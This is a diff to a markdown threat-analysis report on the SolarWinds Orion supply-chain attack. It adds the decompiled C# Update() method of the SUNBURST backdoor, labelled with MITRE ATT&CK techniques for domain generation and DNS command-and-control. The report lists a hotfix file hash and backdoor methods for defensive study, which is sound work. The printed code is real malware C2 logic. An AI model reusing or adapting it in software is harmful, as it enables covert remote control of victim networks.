@@ -5,6 +5,8 @@
 ### Solarwinds Supply Chain Attack (This report still in progress)
 Adversaries gained access to numerous public and private organizations by trojanized SolarWinds Orion software applications updates **(This attack is large, bad and very concerning)**
 
+#
+
 <br /><br />
 SolarWinds-Core-v2019.4.5220-Hotfix5.msp - md5 02af7cec58b9a5da1c542b5a32151ba1
 
@@ -531,6 +533,122 @@ Get all registry keys and values - T1012 Query Registry
 public static void GetRegistrySubKeyAndValueNames(string[] args, out string result)
 {
 	result = OrionImprovementBusinessLayer.RegistryHelper.GetSubKeyAndValueNames(args[0]);
+}
+```
+<br /><br />
+Update - T1568.002 Domain Generation Algorithms & T1071.004 Application Layer Protocol: DNS
+
+```csharp
+private static void Update()
+{
+	bool flag = false;
+	OrionImprovementBusinessLayer.CryptoHelper cryptoHelper = new OrionImprovementBusinessLayer.CryptoHelper(OrionImprovementBusinessLayer.userId, OrionImprovementBusinessLayer.domain4);
+	OrionImprovementBusinessLayer.HttpHelper httpHelper = null;
+	Thread thread = null;
+	bool flag2 = true;
+	OrionImprovementBusinessLayer.AddressFamilyEx addressFamilyEx = OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
+	int num = 0;
+	bool flag3 = true;
+	OrionImprovementBusinessLayer.DnsRecords dnsRecords = new OrionImprovementBusinessLayer.DnsRecords();
+	Random random = new Random();
+	int a = 0;
+	if (!OrionImprovementBusinessLayer.UpdateNotification())
+	{
+		return;
+	}
+	OrionImprovementBusinessLayer.svcListModified2 = false;
+	int num2 = 1;
+	while (num2 <= 3 && !flag)
+	{
+		OrionImprovementBusinessLayer.DelayMin(dnsRecords.A, dnsRecords.A);
+		if (!OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))
+		{
+			if (OrionImprovementBusinessLayer.svcListModified1)
+			{
+				flag3 = true;
+			}
+			num = (OrionImprovementBusinessLayer.svcListModified2 ? (num + 1) : 0);
+			string hostName;
+			if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New)
+			{
+				hostName = ((addressFamilyEx == OrionImprovementBusinessLayer.AddressFamilyEx.Error) ? cryptoHelper.GetCurrentString() : cryptoHelper.GetPreviousString(out flag2));
+			}
+			else
+			{
+				if (OrionImprovementBusinessLayer.status != OrionImprovementBusinessLayer.ReportStatus.Append)
+				{
+					break;
+				}
+				hostName = (flag3 ? cryptoHelper.GetNextStringEx(dnsRecords.dnssec) : cryptoHelper.GetNextString(dnsRecords.dnssec));
+			}
+			addressFamilyEx = OrionImprovementBusinessLayer.DnsHelper.GetAddressFamily(hostName, dnsRecords);
+			switch (addressFamilyEx)
+			{
+			case OrionImprovementBusinessLayer.AddressFamilyEx.NetBios:
+				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
+				{
+					flag3 = false;
+					if (dnsRecords.dnssec)
+					{
+						a = dnsRecords.A;
+						dnsRecords.A = random.Next(1, 3);
+					}
+				}
+				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New && flag2)
+				{
+					OrionImprovementBusinessLayer.status = OrionImprovementBusinessLayer.ReportStatus.Append;
+					OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.status);
+				}
+				if (!string.IsNullOrEmpty(dnsRecords.cname))
+				{
+					dnsRecords.A = a;
+					OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
+					httpHelper = new OrionImprovementBusinessLayer.HttpHelper(OrionImprovementBusinessLayer.userId, dnsRecords);
+					if (!OrionImprovementBusinessLayer.svcListModified2 || num > 1)
+					{
+						OrionImprovementBusinessLayer.svcListModified2 = false;
+						thread = new Thread(new ThreadStart(httpHelper.Initialize))
+						{
+							IsBackground = true
+						};
+						thread.Start();
+					}
+				}
+				num2 = 0;
+				break;
+			case OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink:
+			case OrionImprovementBusinessLayer.AddressFamilyEx.Atm:
+				OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.Truncate);
+				OrionImprovementBusinessLayer.ProcessTracker.SetAutomaticMode();
+				flag = true;
+				break;
+			case OrionImprovementBusinessLayer.AddressFamilyEx.Ipx:
+				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
+				{
+					OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.New);
+				}
+				flag = true;
+				break;
+			case OrionImprovementBusinessLayer.AddressFamilyEx.InterNetwork:
+			case OrionImprovementBusinessLayer.AddressFamilyEx.InterNetworkV6:
+			case OrionImprovementBusinessLayer.AddressFamilyEx.Unknown:
+				goto IL_1F7;
+			case OrionImprovementBusinessLayer.AddressFamilyEx.Error:
+				dnsRecords.A = random.Next(420, 540);
+				break;
+			default:
+				goto IL_1F7;
+			}
+			IL_1F9:
+			num2++;
+			continue;
+			IL_1F7:
+			flag = true;
+			goto IL_1F9;
+		}
+		break;
+	}
+	OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
 }
 ```
 
